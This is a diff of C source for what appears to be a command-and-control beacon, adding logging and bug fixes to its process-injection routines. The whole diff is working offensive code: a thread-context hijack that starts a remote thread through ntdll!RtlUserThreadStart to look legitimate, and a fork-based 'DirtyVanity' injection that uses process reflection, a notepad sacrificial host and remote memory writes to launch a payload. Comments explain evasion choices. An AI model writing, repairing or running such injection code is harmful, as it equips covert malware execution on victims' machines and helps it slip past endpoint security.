@@ -25,6 +25,7 @@
 #include "functions.h"
 #include "bformat.h"
 #include "syscalls.h"
+#include "spawn_trace.h"
 
 #ifndef NTSTATUS
 typedef LONG NTSTATUS;
@@ -69,14 +70,18 @@ static void * remote_exe_entry_x64(HANDLE hProcess) {
 
 	pebaddr = pbi.PebBaseAddress;
 	if (!beacon_ReadProcessMemory(hProcess, (char *)pebaddr + 0x10, &imagebase, 8, &got) || got != 8) {
+		spawn_log("obf: walk FAIL read imagebase gle=", (long)GetLastError());
 		return NULL;
 	}
+	spawn_log("obf: walk imagebase=", (long)(long long)imagebase);
 
 	if (!beacon_ReadProcessMemory(hProcess, (char *)(DWORD_PTR)imagebase, dos, 0x40, &got) || got != 0x40) {
+		spawn_log("obf: walk FAIL read dos gle=", (long)GetLastError());
 		return NULL;
 	}
 
 	if (dos[0] != 'M' || dos[1] != 'Z') {
+		spawn_log("obf: walk FAIL no MZ (stomped headers?)", 0x7fffffff);
 		return NULL;
 	}
 
@@ -108,9 +113,11 @@ BOOL inject_via_obfsetthreadcontext(INJECTCONTEXT * context, LPVOID lpStartAddre
 	void * legit = NULL;
 	CONTEXT c;
 
+	spawn_log("obf: chain entry pid=", (long)context->pid);
 
 	/* same architecture only (4.11 constraint) */
 	if (!context->sameArch) {
+		spawn_log("obf: FAIL arch mismatch", 0x7fffffff);
 		return FALSE;
 	}
 
@@ -118,26 +125,33 @@ BOOL inject_via_obfsetthreadcontext(INJECTCONTEXT * context, LPVOID lpStartAddre
 	 * SetThreadContext opcode handles that case; this one targets running
 	 * processes where we mint a new, legitimately-started thread */
 	if (context->isSuspended) {
+		spawn_log("obf: FAIL suspended target", 0x7fffffff);
 		return FALSE;
 	}
 
 	legit = remote_exe_entry_x64(context->hProcess);
 	if (legit == NULL) {
+		spawn_log("obf: FAIL remote entry walk", 0x7fffffff);
 		return FALSE;
 	}
+	spawn_log("obf: legit entry=", (long)(long long)legit);
 
 	hThread = beacon_CreateRemoteThread(context->hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)legit, lpParameter, CREATE_SUSPENDED, NULL);
 	if (hThread == NULL) {
+		spawn_log("obf: FAIL CreateRemoteThread gle=", (long)GetLastError());
 		return FALSE;
 	}
+	spawn_log("obf: CRT ok thread=", (long)(long long)hThread);
 
 	ZeroMemory(&c, sizeof(c));
 	c.ContextFlags = CONTEXT_FULL;
 	if (!GetThreadContext(hThread, &c)) {
+		spawn_log("obf: FAIL GetThreadContext gle=", (long)GetLastError());
 		TerminateThread(hThread, 0);
 		CloseHandle(hThread);
 		return FALSE;
 	}
+	spawn_log("obf: GTC ok orig rip=", (long)c.Rip);
 
 	/* route the thread through ntdll!RtlUserThreadStart instead of
 	 * jumping straight to the payload: a thread whose context skips the
@@ -150,6 +164,7 @@ BOOL inject_via_obfsetthreadcontext(INJECTCONTEXT * context, LPVOID lpStartAddre
 	{
 		void * ustart = (void *)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlUserThreadStart");
 		if (ustart == NULL) {
+			spawn_log("obf: FAIL no RtlUserThreadStart", 0x7fffffff);
 			TerminateThread(hThread, 0);
 			CloseHandle(hThread);
 			return FALSE;
@@ -160,6 +175,7 @@ BOOL inject_via_obfsetthreadcontext(INJECTCONTEXT * context, LPVOID lpStartAddre
 	}
 
 	if (!SetThreadContext(hThread, &c)) {
+		spawn_log("obf: FAIL SetThreadContext gle=", (long)GetLastError());
 		TerminateThread(hThread, 0);
 		CloseHandle(hThread);
 		return FALSE;
@@ -167,6 +183,7 @@ BOOL inject_via_obfsetthreadcontext(INJECTCONTEXT * context, LPVOID lpStartAddre
 
 	ResumeThread(hThread);
 	CloseHandle(hThread);
+	spawn_log("obf: resumed, payload=", (long)(long long)lpStartAddress);
 	return TRUE;
 #endif
 }
@@ -244,6 +261,15 @@ typedef NTSTATUS(NTAPI *fRtlCreateProcessReflection)(void *, unsigned long, void
  * remote threads, no inherited-runtime poisoning, identical image. */
 typedef struct {
 	volatile LONG go;
+	volatile LONG magic;  /* parent stamps DV_MAGIC when it fills the mailbox;
+	                       * the clone CLEARS it as its very first action after
+	                       * the go-flip. The parent only trusts `stage` once
+	                       * magic is gone - the previous code read an
+	                       * UNINITIALIZED stack DV_MAILBOX (mb.stage carried
+	                       * whatever the stack held, e.g. 679), wrote that
+	                       * garbage into the clone and then its probe loop
+	                       * (stage >= 20) reported the junk as launcher
+	                       * progress and bailed out after one poll. */
 	DWORD  host_pid;  /* suspended host pre-created by the healthy parent.
 	                   * PID, not handle: the fork's handle-table copy does
 	                   * not guarantee value stability, a PID is process-
@@ -258,7 +284,9 @@ typedef struct {
 	volatile LONG last_st;/* NTSTATUS of the failing call, if any */
 } DV_MAILBOX;
 
-static DV_MAILBOX dv_mailbox = { 0, NULL, NULL, 0, NULL, 0 };
+#define DV_MAGIC 0x44564D42 /* 'DVMB' */
+
+static DV_MAILBOX dv_mailbox = { 0, 0, 0, NULL, 0, NULL, 0, 0, 0 };
 static HANDLE dv_clone_handle = NULL;
 static DWORD  dv_clone_pid = 0;
 static DWORD  dv_host_pid = 0;
@@ -281,6 +309,10 @@ static void dv_clone_launch(DWORD host_pid, char * payload, int plen, void * par
 	DWORD  oldp = 0;
 	HANDLE host;
 	HANDLE ht;
+
+	/* consume handshake: the parent's probe only trusts `stage` once the
+	 * magic is gone (see the DV_MAILBOX comment) */
+	dv_mailbox.magic = 0;
 
 	if (host_pid == 0) {
 		dv_mailbox.stage = 2;
@@ -366,21 +398,33 @@ void dv_nursery_init(void) {
 	/* pre-create the suspended launch host NOW, from the healthy parent:
 	 * the clone's torn runtime cannot even CreateProcessA (live: AV in
 	 * KERNELBASE), so the host must exist before the fork - its handle
-	 * rides into the clone through INHERIT_HANDLES (copied 1:1) */
+	 * rides into the clone through INHERIT_HANDLES (copied 1:1).
+	 *
+	 * The host must ALSO be a RUNNING, loader-initialized process: a
+	 * CREATE_SUSPENDED process never runs LdrpInitialize, so its MRDATA
+	 * heap (ntdll's dynamic function-table store) does not exist and the
+	 * payload's RL dies inside RtlAddFunctionTable ->
+	 * LdrEnsureMrdataHeapExists (live WER: rundll32.exe AV in ntdll
+	 * +0x691c6, 2026-11-05). notepad is fully initialized, stays alive
+	 * on its own, and matches the sacrificial-host convention the
+	 * injection family tests already use. */
 	{
 		STARTUPINFOA        si;
 		PROCESS_INFORMATION pi;
 		ZeroMemory(&si, sizeof(si));
 		si.cb = sizeof(si);
 		ZeroMemory(&pi, sizeof(pi));
-		if (!CreateProcessA(NULL, (LPSTR)"rundll32.exe", NULL, NULL, FALSE,
-		                    CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
+		if (!CreateProcessA(NULL, (LPSTR)"notepad.exe", NULL, NULL, FALSE,
+		                    0, NULL, NULL, &si, &pi)) {
+			spawn_log("dv: host pre-create failed gle=", (long)GetLastError());
 			return;
 		}
 		dv_mailbox.host_pid = pi.dwProcessId;
 		dv_host_pid       = pi.dwProcessId;
-		/* pi.hThread stays suspended forever - the injected beacon owns
-		 * the host; keep the handle to avoid cleanup complexity */
+		/* the clone re-opens the host by PID (NtOpenProcess); the parent
+		 * needs no handle. The host lives on as the beacon's home. */
+		CloseHandle(pi.hThread);
+		CloseHandle(pi.hProcess);
 	}
 
 	/* the raw-syscall stubs must be resolved in the healthy parent so the
@@ -391,16 +435,20 @@ void dv_nursery_init(void) {
 	 * in git history - every NO_SYNCHRONIZE combo is rejected here) */
 	ZeroMemory(&info, sizeof(info));
 	if (pReflect(GetCurrentProcess(), 0x2 | 0x4, dv_nursery_trampoline, NULL, NULL, &info) != 0) {
+		spawn_log("dv: nursery reflect failed", 0x7fffffff);
 		return;
 	}
 
 	dv_clone_handle = info.ReflectionProcessHandle;
 	pid = (DWORD)(DWORD_PTR)info.UniqueProcess;
 	if (dv_clone_handle == NULL || pid == 0 || pid == GetCurrentProcessId()) {
+		spawn_log("dv: nursery layout mismatch? pid=", (long)pid);
 		dv_clone_handle = NULL;
 		return;
 	}
 	dv_clone_pid = pid;
+	spawn_log("dv: nursery up, clone pid=", (long)pid);
+	spawn_log("dv: host pid=", (long)dv_host_pid);
 }
 
 BOOL inject_dirtyvanity_forkrun(char * dll, int dllen, int offset, char * parameter, int plen) {
@@ -428,6 +476,7 @@ BOOL inject_dirtyvanity_forkrun(char * dll, int dllen, int offset, char * parame
 
 	remote = VirtualAllocEx(hc, NULL, (SIZE_T)dllen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 	if (remote == NULL || !WriteProcessMemory(hc, remote, dll, (SIZE_T)dllen, &got) || got != (SIZE_T)dllen) {
+		spawn_log("dv: payload write failed gle=", (long)GetLastError());
 		return FALSE;
 	}
 	VirtualProtectEx(hc, remote, (SIZE_T)dllen, PAGE_EXECUTE_READ, &oldp);
@@ -435,11 +484,17 @@ BOOL inject_dirtyvanity_forkrun(char * dll, int dllen, int offset, char * parame
 	if (plen > 0) {
 		rparam = VirtualAllocEx(hc, NULL, (SIZE_T)plen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 		if (rparam == NULL || !WriteProcessMemory(hc, rparam, parameter, (SIZE_T)plen, &got) || got != (SIZE_T)plen) {
+			spawn_log("dv: param write failed gle=", (long)GetLastError());
 			return FALSE;
 		}
 	}
 
-	mb.go       = 1;
+	/* FILL THE WHOLE STRUCT: the old code left stage/last_st as stack
+	 * garbage and wrote them into the clone, and the probe loop then read
+	 * that junk back as "progress" (the observed stage=679). */
+	ZeroMemory(&mb, sizeof(mb));
+	mb.magic    = DV_MAGIC;
+	mb.go       = 0; /* flipped in a second write below */
 	mb.host_pid = dv_host_pid;
 	mb.payload  = (char *)remote; /* the clone launches the payload at its
 	                               * base (offset-0 convention); job-style
@@ -449,25 +504,54 @@ BOOL inject_dirtyvanity_forkrun(char * dll, int dllen, int offset, char * parame
 	mb.param    = rparam;
 	mb.plen_arg = plen;
 	/* dv_mailbox lives in our image - the clone's inherited copy sits at
-	 * the identical VA (fork preserves the address space) */
+	 * the identical VA (fork preserves the address space).
+	 * Two-phase write: every field lands while go is still 0, then go is
+	 * flipped on its own - the clone cannot wake up on a half-written
+	 * mailbox (go used to be the FIRST byte of a single torn write). */
 	if (!WriteProcessMemory(hc, &dv_mailbox, &mb, sizeof(mb), &got) || got != sizeof(mb)) {
+		spawn_log("dv: mailbox write failed gle=", (long)GetLastError());
 		return FALSE;
 	}
+	{
+		LONG go = 1;
+		if (!WriteProcessMemory(hc, &dv_mailbox, &go, sizeof(go), &got) || got != sizeof(go)) {
+			spawn_log("dv: mailbox go flip failed gle=", (long)GetLastError());
+			return FALSE;
+		}
+	}
 
+	spawn_log("dv: payload delivered to clone pid=", (long)dv_clone_pid);
 
 	/* read the trampoline's progress back through the clone handle (its
-	 * mailbox copy carries the stage) - the launcher is otherwise mute */
+	 * mailbox copy carries the stage) - the launcher is otherwise mute.
+	 * Only a mailbox whose magic is GONE has been consumed by the clone;
+	 * until then `stage` is the value *we* wrote (0). */
 	{
 		int i;
+		LONG last_stage = -1;
+		LONG still_magic = 0;
 		for (i = 0; i < 20; i++) {
 			DV_MAILBOX probe;
 			SIZE_T got2 = 0;
 			Sleep(150);
 			if (beacon_ReadProcessMemory(hc, &dv_mailbox, &probe, sizeof(probe), &got2) && got2 == sizeof(probe)) {
-				if (probe.stage >= 99 || probe.stage >= 20) {
+				still_magic = probe.magic;
+				if (probe.magic == DV_MAGIC) {
+					continue; /* clone has not consumed the mailbox yet */
+				}
+				last_stage = probe.stage;
+				if (probe.stage >= 20) { /* 20/21/30/31/40/41/50/51/60/99 */
+					spawn_log("dv: launcher stage=", (long)probe.stage);
+					if (probe.stage < 99)
+						spawn_log("dv: launcher last_st=", (long)probe.last_st);
 					break;
 				}
 			}
+		}
+		if (i == 20) {
+			/* loop exhausted: the clone never reported a terminal stage */
+			spawn_log("dv: probe exhausted magic=", (long)still_magic);
+			spawn_log("dv: probe exhausted stage=", (long)last_stage);
 		}
 	}
 
